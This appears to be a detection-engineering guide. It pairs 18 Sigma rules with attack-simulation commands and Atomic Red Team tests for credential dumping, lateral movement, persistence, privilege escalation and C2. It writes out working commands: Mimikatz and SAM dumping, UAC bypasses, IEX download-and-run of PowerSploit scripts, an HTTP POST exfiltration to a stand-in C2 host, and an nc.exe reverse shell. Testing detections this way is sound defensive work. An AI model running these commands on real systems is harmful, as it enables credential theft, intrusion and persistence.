# Attack Scenario Testing Guide

This document provides detailed attack scenarios for testing each Sigma detection rule.

---

## Credential Dumping Scenarios

### Rule 001: Mimikatz Execution Detection

**Attack Simulation:**
```powershell
# Download Mimikatz (testing environment only!)
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "C:\Temp\mimikatz.zip"
Expand-Archive "C:\Temp\mimikatz.zip" -DestinationPath "C:\Temp\mimikatz"

# Execute Mimikatz
cd C:\Temp\mimikatz\x64
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Expected Detection:**
- Alert within 10 seconds
- Detection of "sekurlsa::logonpasswords" in command line
- Process name: mimikatz.exe

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1003.001 -TestGuids b381975a-4fc8-4e8e-8a8e-4c4b5c7e9f5a
```

---

### Rule 002: LSASS Process Memory Access

**Attack Simulation:**
```powershell
# Use Task Manager to access lsass.exe (GUI)
# OR use PowerShell
$proc = Get-Process lsass
$handle = [YourNamespace.Win32]::OpenProcess(0x1410, $false, $proc.Id)
```

**Expected Detection:**
- Sysmon Event ID 10 (Process Access)
- TargetImage: lsass.exe
- GrantedAccess: 0x1410

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 2
```

---

### Rule 003: Credential Manager Access

**Attack Simulation:**
```cmd
# List stored credentials
vaultcmd /listcreds:"Windows Credentials" /all

# Using cmdkey
cmdkey /list

# PowerShell method
powershell -Command "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]"
```

**Expected Detection:**
- vaultcmd.exe execution with /list parameter
- Alert within 10 seconds

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1555.004 -TestNumbers 1
```

---

### Rule 004: SAM Database Access

**Attack Simulation:**
```cmd
# Save SAM hive (requires admin privileges)
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save

# Shadow copy method
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM C:\Temp\sam
```

**Expected Detection:**
- reg.exe with "save" and "HKLM\SAM"
- Shadow copy creation followed by SAM access

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1003.002 -TestNumbers 1,2
```

---

## Lateral Movement Scenarios

### Rule 005: PsExec Remote Execution

**Attack Simulation:**
```cmd
# Download PsExec
# From Sysinternals: https://download.sysinternals.com/files/PSTools.zip

# Execute remote command
PsExec.exe \\TARGET-PC -u DOMAIN\username -p password cmd.exe /c whoami

# Service installation method
PsExec.exe \\TARGET-PC -s cmd.exe
```

**Expected Detection:**
- PsExec.exe process creation
- Named pipe: \psexec
- Service creation: PSEXESVC

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1021.002 -TestNumbers 1
```

---

### Rule 006: WMI Remote Execution

**Attack Simulation:**
```cmd
# Using wmic
wmic /node:TARGET-PC process call create "cmd.exe /c calc.exe"

# PowerShell method
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName TARGET-PC
```

**Expected Detection:**
- wmic.exe with /node: parameter
- PowerShell with Invoke-WmiMethod

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1047 -TestNumbers 1,2
```

---

### Rule 007: SMB Share Enumeration

**Attack Simulation:**
```cmd
# Using net.exe
net view \\TARGET-PC
net view /domain

# PowerShell method
Get-SmbShare -CimSession TARGET-PC
Invoke-ShareFinder

# BloodHound/SharpHound
.\SharpHound.exe -c All
```

**Expected Detection:**
- net.exe with "view" parameter
- PowerShell Get-SmbShare cmdlet
- Multiple SMB connections in short time

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1135 -TestNumbers 1,2
```

---

### Rule 008: NTLM Relay Detection

**Attack Simulation:**
```bash
# On attacker machine (Kali Linux):
# Using Responder
sudo responder -I eth0 -wrf

# Using ntlmrelayx
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Monitor for Event ID 4624 with unusual patterns
```

**Expected Detection:**
- Event ID 4624 with NTLM authentication
- WorkstationName anomalies
- Multiple failed followed by successful auth

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1557.001 -TestNumbers 1
```

---

## Persistence Scenarios

### Rule 009: Registry Run Key Modification

**Attack Simulation:**
```cmd
# Add Run key entry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MalwareTest /t REG_SZ /d "C:\Windows\System32\calc.exe"

# PowerShell method
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence" -Value "C:\Temp\malware.exe" -PropertyType String
```

**Expected Detection:**
- reg.exe with "add" and "CurrentVersion\Run"
- Sysmon Event ID 13 (Registry modification)

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 1,2
```

---

### Rule 010: Scheduled Task Creation

**Attack Simulation:**
```cmd
# Create scheduled task
schtasks /create /tn "UpdateTask" /tr "C:\Temp\malware.exe" /sc onlogon /ru SYSTEM

# PowerShell method
$action = New-ScheduledTaskAction -Execute "C:\Temp\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MaliciousTask" -RunLevel Highest
```

**Expected Detection:**
- schtasks.exe with /create parameter
- PowerShell Register-ScheduledTask cmdlet

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1,2,3
```

---

### Rule 011: Startup Folder Modification

**Attack Simulation:**
```cmd
# Copy malicious file to Startup
copy C:\Temp\malware.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe"

# Create LNK file in Startup
powershell -Command "$ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\test.lnk'); $sc.TargetPath = 'C:\Windows\System32\calc.exe'; $sc.Save()"
```

**Expected Detection:**
- File creation in Startup folder
- Sysmon Event ID 11 (File creation)

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1547.001 -TestNumbers 4
```

---

## Privilege Escalation Scenarios

### Rule 012: Token Impersonation

**Attack Simulation:**
```powershell
# Using Invoke-TokenManipulation
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1')
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Using Incognito
incognito.exe list_tokens -u
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```

**Expected Detection:**
- Event ID 4672 with SeImpersonatePrivilege
- Event ID 4673 (Privilege use)

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1134.001 -TestNumbers 1,2
```

---

### Rule 013: UAC Bypass

**Attack Simulation:**
```powershell
# Fodhelper UAC bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start powershell.exe"
Start-Process "C:\Windows\System32\fodhelper.exe"

# Eventvwr UAC bypass
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c calc.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"
```

**Expected Detection:**
- Process creation from fodhelper.exe or eventvwr.exe
- Registry modifications to bypass keys

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1548.002 -TestNumbers 1,2,3
```

---

### Rule 014: SeDebug Privilege Enabled

**Attack Simulation:**
```powershell
# PowerShell accessing lsass with SeDebug
$proc = Get-Process lsass
# Attempt to read memory (requires SeDebugPrivilege)
```

**Expected Detection:**
- Event ID 4673 with SeDebugPrivilege
- Non-debugger process using SeDebug

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1134.001 -TestNumbers 3
```

---

### Rule 015: Process Injection

**Attack Simulation:**
```powershell
# CreateRemoteThread injection
mavinject.exe $PROCESS_ID /INJECTRUNNING C:\Temp\malicious.dll

# PowerShell Invoke-ReflectivePEInjection
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
```

**Expected Detection:**
- Sysmon Event ID 8 (CreateRemoteThread)
- Sysmon Event ID 10 (Process Access)

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1055 -TestNumbers 1,2
```

---

## Command & Control Scenarios

### Rule 016: DNS Beaconing

**Attack Simulation:**
```powershell
# Simulate DNS beaconing
1..100 | % {
    Resolve-DnsName -Name "beacon$_.attacker-c2.com" -Type TXT
    Start-Sleep -Seconds 5
}

# DNS tunneling simulation
# Using dnscat2 or iodine
```

**Expected Detection:**
- High frequency DNS queries (>50 per minute)
- TXT record queries
- Long subdomain names

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1071.004 -TestNumbers 1,2
```

---

### Rule 017: HTTP POST C2 Activity

**Attack Simulation:**
```powershell
# PowerShell beaconing
while($true) {
    $data = Get-Process | ConvertTo-Json
    Invoke-WebRequest -Uri "http://c2-server.com/beacon" -Method POST -Body $data -UserAgent "Mozilla/5.0"
    Start-Sleep -Seconds 60
}

# Using curl
curl -X POST http://c2-server.com/upload -d @data.txt
```

**Expected Detection:**
- PowerShell making HTTP POST requests
- Regular POST intervals (beaconing)
- Non-browser user agents

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1071.001 -TestNumbers 1,2,3
```

---

### Rule 018: Rare Outbound Port Usage

**Attack Simulation:**
```bash
# Netcat reverse shell
nc.exe attacker-ip 4444 -e cmd.exe

# PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444)
$stream = $client.GetStream()
```

**Expected Detection:**
- Sysmon Event ID 3 (Network connection)
- Connection to rare ports (4444, 8888, 31337)
- Non-browser processes making connections

**Atomic Red Team:**
```powershell
Invoke-AtomicTest T1095 -TestNumbers 1
```

---

## Testing Checklist

For each rule test:

- [ ] Prepare clean baseline (snapshot VM if virtual)
- [ ] Execute attack simulation
- [ ] Wait 30-60 seconds for log ingestion
- [ ] Check SIEM for alert
- [ ] Record detection latency
- [ ] Document any false positives
- [ ] Reset environment to baseline
- [ ] Tune rule if necessary
- [ ] Retest after tuning

## Metrics to Collect

1. **Detection Rate**: Did the rule fire? (Yes/No)
2. **Detection Latency**: Time from attack to alert (seconds)
3. **False Positive Rate**: FP count per 1000 benign events
4. **True Positive Rate**: TP count per 100 malicious events
5. **Alert Quality**: High/Medium/Low fidelity

## Success Criteria

- **Detection Rate**: ≥95% (18/18 rules)
- **Mean Detection Latency**: <10 seconds
- **False Positive Rate**: <2% per rule
- **Overall Coverage**: ≥85% of MITRE ATT&CK techniques
